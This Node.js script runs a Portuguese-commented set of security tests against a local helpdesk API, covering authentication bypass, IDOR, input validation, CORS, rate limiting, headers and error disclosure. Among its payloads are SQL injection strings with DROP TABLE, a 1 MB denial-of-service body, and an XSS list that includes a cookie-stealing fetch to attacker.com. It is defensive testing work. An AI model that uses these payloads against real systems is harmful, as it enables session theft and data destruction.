/**
 * TESTES DE SEGURANÇA AVANÇADOS - Helpdesk API
 * Testes mais profundos de vulnerabilidades
 *
 * Uso: node advanced-security-tests.js
 */

const http = require('http');

const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m'
};

let results = {
    critical: [],
    high: [],
    medium: [],
    low: [],
    passed: []
};

async function request(method, path, body = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'localhost',
            port: 3000,
            path,
            method,
            headers: {
                'Content-Type': 'application/json',
                ...headers
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: data,
                    parsed: (() => {
                        try { return JSON.parse(data); } catch { return null; }
                    })()
                });
            });
        });

        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

function reportVulnerability(severity, title, description, impact, poc) {
    const vuln = { severity, title, description, impact, poc };

    switch(severity) {
        case 'CRITICAL': results.critical.push(vuln); break;
        case 'HIGH': results.high.push(vuln); break;
        case 'MEDIUM': results.medium.push(vuln); break;
        case 'LOW': results.low.push(vuln); break;
    }

    const icon = {
        'CRITICAL': '🔴',
        'HIGH': '🟠',
        'MEDIUM': '🟡',
        'LOW': '🔵'
    }[severity];

    console.log(`\n${icon} ${severity}: ${title}`);
    console.log(`   ${colors.yellow}${description}${colors.reset}`);
    console.log(`   ${colors.red}Impacto: ${impact}${colors.reset}`);
    console.log(`   ${colors.cyan}PoC: ${poc}${colors.reset}`);
}

function reportPass(title, description) {
    results.passed.push({ title, description });
    console.log(`${colors.green}✓ ${title}${colors.reset}`);
}

async function testBrokenAuthentication() {
    console.log(`\n${colors.blue}═ Broken Authentication & Session Management ═${colors.reset}`);

    try {
        // Teste 1: Acesso sem autenticação
        const res1 = await request('GET', '/api/tickets');
        if (res1.status === 200) {
            reportVulnerability('CRITICAL',
                'Acesso sem autenticação',
                'API não requer credentials para acessar dados',
                'Qualquer pessoa pode ler todos os tickets',
                'curl http://localhost:3000/api/tickets'
            );
        } else {
            reportPass('Autenticação requerida', 'API exige credenciais');
        }

        // Teste 2: Token vazio
        const res2 = await request('GET', '/api/tickets', null, {
            'Authorization': ''
        });
        if (res2.status === 200) {
            reportVulnerability('HIGH',
                'Token vazio aceito',
                'Headers de autorização vazios são aceitos',
                'Bypass de autenticação',
                'curl -H "Authorization: " http://localhost:3000/api/tickets'
            );
        }

        // Teste 3: Token inválido
        const res3 = await request('GET', '/api/tickets', null, {
            'Authorization': 'Bearer INVALID_TOKEN_' + 'A'.repeat(100)
        });
        if (res3.status === 200) {
            reportVulnerability('CRITICAL',
                'Token inválido aceito',
                'Tokens com formato inválido são aceitos',
                'Bypass completo de autenticação',
                'curl -H "Authorization: Bearer INVALID" http://localhost:3000/api/tickets'
            );
        }

        // Teste 4: Cookie session não implementado
        const res4 = await request('GET', '/api/tickets');
        if (!res4.headers['set-cookie']) {
            console.log(`${colors.yellow}⚠ Sem gerenciamento de sessão (expected - usar JWT)${colors.reset}`);
        }

    } catch(err) {
        console.error('Erro em autenticação:', err.message);
    }
}

async function testBrokenAccessControl() {
    console.log(`\n${colors.blue}═ Broken Object Level Authorization (IDOR) ═${colors.reset}`);

    try {
        // Cria 2 tickets com dados diferentes
        const res1 = await request('POST', '/api/tickets', {
            titulo: 'TICKET_USUARIO_1',
            descricao: 'Dados confidenciais',
            assignee: 'usuario1'
        });

        if (res1.status === 201) {
            const ticket1 = res1.parsed;

            // Tenta acessar com outro usuário (sem autenticação, pois não há)
            const res2 = await request('GET', `/api/tickets/${ticket1.id}`);
            if (res2.status === 200) {
                reportVulnerability('CRITICAL',
                    'Broken Access Control (IDOR)',
                    'Qualquer um pode acessar qualquer recurso via ID',
                    'Leitura não autorizada de todos os tickets',
                    `curl http://localhost:3000/api/tickets/${ticket1.id}`
                );

                // Teste de modificação
                const res3 = await request('PUT', `/api/tickets/${ticket1.id}`, {
                    titulo: 'MODIFICADO_POR_HACKER',
                    assignee: 'hacker'
                });

                if (res3.status === 200) {
                    reportVulnerability('CRITICAL',
                        'Privilégio não autorizado',
                        'Qualquer um pode editar tickets de outros usuários',
                        'Modificação não autorizada de dados',
                        `curl -X PUT http://localhost:3000/api/tickets/${ticket1.id} -d '{"assignee":"hacker"}'`
                    );
                }
            }
        }

    } catch(err) {
        console.error('Erro em acesso:', err.message);
    }
}

async function testInputValidation() {
    console.log(`\n${colors.blue}═ Sensitive Data Exposure & Input Validation ═${colors.reset}`);

    try {
        // Teste 1: Campos obrigatórios
        const res1 = await request('POST', '/api/tickets', {
            titulo: '',
            descricao: null
        });

        if (res1.status === 201) {
            reportVulnerability('HIGH',
                'Validação de campo obrigatório',
                'Campos nulos/vazios são aceitos',
                'Dados corrompidos no banco',
                'curl -X POST ... -d \'{"titulo":"","descricao":null}\''
            );
        } else {
            reportPass('Validação de campos', 'Campos obrigatórios são validados');
        }

        // Teste 2: Tamanho de entrada (DoS)
        const bigPayload = 'A'.repeat(1000000); // 1MB
        const res2 = await request('POST', '/api/tickets', {
            titulo: bigPayload,
            descricao: bigPayload
        });

        if (res2.status === 201 || res2.status === 413 === false) {
            reportVulnerability('HIGH',
                'Sem validação de tamanho',
                'Payloads gigantes são aceitos',
                'DoS via request flooding com payloads grandes',
                'Enviar titulo com 1MB+'
            );
        } else {
            reportPass('Limite de payload', 'Servidor limita tamanho de entrada');
        }

        // Teste 3: Injeção de tipos
        const res3 = await request('POST', '/api/tickets', {
            titulo: { nested: { object: 'injection' } },
            descricao: ['array', 'injection']
        });

        if (res3.status === 201) {
            reportVulnerability('MEDIUM',
                'Tipos não validados',
                'Objetos/arrays em campos string são aceitos',
                'Comportamento imprevisto ou erro no storage',
                'Enviar {"titulo": {"objeto": "aqui"}}'
            );
        }

        // Teste 4: Caracteres especiais SQL
        const res4 = await request('POST', '/api/tickets', {
            titulo: "'; DROP TABLE tickets; --",
            descricao: "' OR '1'='1"
        });

        if (res4.status === 201) {
            // Verifica se a tabela ainda existe
            const checkRes = await request('GET', '/api/tickets');
            if (checkRes.status === 200) {
                reportPass('SQL Injection Protection', 'Prepared statements protegem contra SQL injection');
            }
        }

    } catch(err) {
        console.error('Erro em validação:', err.message);
    }
}

async function testXSSVulnerabilities() {
    console.log(`\n${colors.blue}═ Stored XSS & DOM-based XSS ═${colors.reset}`);

    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<textarea onfocus="fetch(\'http://attacker.com?cookie=\'+btoa(document.cookie))" autofocus>',
    ];

    try {
        for (const payload of xssPayloads.slice(0, 3)) {
            const res = await request('POST', '/api/tickets', {
                titulo: payload,
                descricao: 'teste'
            });

            if (res.status === 201) {
                // Verifica se o payload foi escapado
                if (res.body.includes('<script>') || res.body.includes('onerror=')) {
                    reportVulnerability('HIGH',
                        'Stored XSS',
                        `Payload não escapado: ${payload}`,
                        'Execução de JavaScript arbitrário quando ticket é visualizado',
                        `curl -X POST ... -d '{"titulo":"${payload}"}'`
                    );
                    break;
                }
            }
        }

    } catch(err) {
        console.error('Erro em XSS:', err.message);
    }
}

async function testCORS() {
    console.log(`\n${colors.blue}═ CORS & CSRF ═${colors.reset}`);

    try {
        const res = await request('GET', '/api/tickets', null, {
            'Origin': 'http://attacker.com'
        });

        if (res.headers['access-control-allow-origin'] === '*' ||
            res.headers['access-control-allow-origin'] === 'http://attacker.com') {
            reportVulnerability('HIGH',
                'CORS muito permissivo',
                'Aceita requisições de qualquer origem',
                'Ataques CSRF, vazamento de dados entre domínios',
                'Requisição do domínio http://attacker.com'
            );
        } else if (!res.headers['access-control-allow-origin']) {
            reportPass('CORS Restrito', 'Sem CORS permissivo');
        }

    } catch(err) {
        console.error('Erro em CORS:', err.message);
    }
}

async function testRateLimitingAdvanced() {
    console.log(`\n${colors.blue}═ Rate Limiting & Brute Force ═${colors.reset}`);

    try {
        const attempts = [];
        const startTime = Date.now();

        // 50 requisições em paralelo
        const promises = [];
        for (let i = 0; i < 50; i++) {
            promises.push(
                request('POST', '/api/tickets', {
                    titulo: `Teste ${i}`,
                    descricao: 'teste'
                }).then(res => attempts.push(res.status))
            );
        }

        await Promise.all(promises);
        const duration = Date.now() - startTime;

        const tooManyRequests = attempts.filter(s => s === 429).length;
        const successful = attempts.filter(s => s === 201).length;

        if (tooManyRequests === 0 && successful > 40) {
            reportVulnerability('HIGH',
                'Sem rate limiting',
                `${successful} requisições aceitas sem bloqueio`,
                'Força bruta, DoS, abuso de API',
                'Loop de 50 requisições POST simultâneas'
            );
        } else if (tooManyRequests > 0) {
            reportPass('Rate Limiting', `Bloqueou ${tooManyRequests} requisições`);
        }

    } catch(err) {
        console.error('Erro em rate limiting:', err.message);
    }
}

async function testSecurityHeaders() {
    console.log(`\n${colors.blue}═ Missing Security Headers ═${colors.reset}`);

    try {
        const res = await request('GET', '/');

        const requiredHeaders = {
            'x-content-type-options': 'nosniff',
            'x-frame-options': ['DENY', 'SAMEORIGIN'],
            'x-xss-protection': '1; mode=block',
            'strict-transport-security': 'max-age=',
            'content-security-policy': 'default-src'
        };

        let missing = [];
        for (const [header, expected] of Object.entries(requiredHeaders)) {
            const value = res.headers[header.toLowerCase()];

            if (!value) {
                missing.push(header);
                reportVulnerability('MEDIUM',
                    `Missing ${header}`,
                    `Header ${header} não está configurado`,
                    'Vulnerável a XSS, clickjacking, MIME-sniffing',
                    `curl -i http://localhost:3000/ | grep "${header}"`
                );
            }
        }

        if (missing.length === 0) {
            reportPass('Security Headers', 'Todos os headers essenciais configurados');
        }

    } catch(err) {
        console.error('Erro em headers:', err.message);
    }
}

async function testErrorHandling() {
    console.log(`\n${colors.blue}═ Information Disclosure & Error Handling ═${colors.reset}`);

    try {
        // Erro de database
        const res1 = await request('GET', '/api/tickets/invalid-id');

        if (res1.body.includes('sqlite') || res1.body.includes('database') ||
            res1.body.includes('Error:')) {
            reportVulnerability('MEDIUM',
                'Error messages reveal system info',
                'Erros detalhados da database são expostos',
                'Enumeração de tecnologia, descoberta de estrutura',
                'curl http://localhost:3000/api/tickets/invalid-id'
            );
        }

        // Endpoint não existente
        const res2 = await request('GET', '/secret/admin/backdoor');
        if (res2.status !== 404) {
            reportVulnerability('LOW',
                'Informação de rota vaza',
                'Endpoints não encontrados retornam algo diferente de 404',
                'Enumeração de rotas',
                'curl http://localhost:3000/secret/admin/backdoor'
            );
        }

    } catch(err) {
        console.error('Erro em error handling:', err.message);
    }
}

async function printReport() {
    console.log(`\n${colors.blue}═══════════════════════════════════════════════${colors.reset}`);
    console.log(`${colors.blue}RELATÓRIO FINAL DE TESTES DE SEGURANÇA${colors.reset}`);
    console.log(`${colors.blue}═══════════════════════════════════════════════${colors.reset}`);

    console.log(`\n${colors.red}CRÍTICAS: ${results.critical.length}${colors.reset}`);
    results.critical.forEach((v, i) => {
        console.log(`  ${i + 1}. ${v.title}`);
    });

    console.log(`\n${colors.yellow}ALTAS: ${results.high.length}${colors.reset}`);
    results.high.forEach((v, i) => {
        console.log(`  ${i + 1}. ${v.title}`);
    });

    console.log(`\n${colors.yellow}MÉDIAS: ${results.medium.length}${colors.reset}`);
    results.medium.forEach((v, i) => {
        console.log(`  ${i + 1}. ${v.title}`);
    });

    console.log(`\n${colors.green}PASSOU: ${results.passed.length}${colors.reset}`);
    results.passed.forEach((v, i) => {
        console.log(`  ${i + 1}. ${v.title}`);
    });

    const totalVulnerabilities = results.critical.length + results.high.length +
                                 results.medium.length + results.low.length;
    const riskScore = (results.critical.length * 10) + (results.high.length * 7) +
                      (results.medium.length * 4) + (results.low.length * 1);

    console.log(`\n${colors.blue}═══════════════════════════════════════════════${colors.reset}`);
    console.log(`Total de vulnerabilidades: ${totalVulnerabilities}`);
    console.log(`Risk Score: ${riskScore}/100`);

    if (riskScore > 70) {
        console.log(`${colors.red}RISCO CRÍTICO - Não usar em produção!${colors.reset}`);
    } else if (riskScore > 40) {
        console.log(`${colors.yellow}RISCO ALTO - Correções imediatas necessárias${colors.reset}`);
    }
    console.log(`${colors.blue}═══════════════════════════════════════════════${colors.reset}\n`);
}

async function main() {
    try {
        await testBrokenAuthentication();
        await testBrokenAccessControl();
        await testInputValidation();
        await testXSSVulnerabilities();
        await testCORS();
        await testRateLimitingAdvanced();
        await testSecurityHeaders();
        await testErrorHandling();

        await printReport();
    } catch(err) {
        console.error(`${colors.red}Erro fatal:${colors.reset}`, err.message);
        process.exit(1);
    }
}

main();
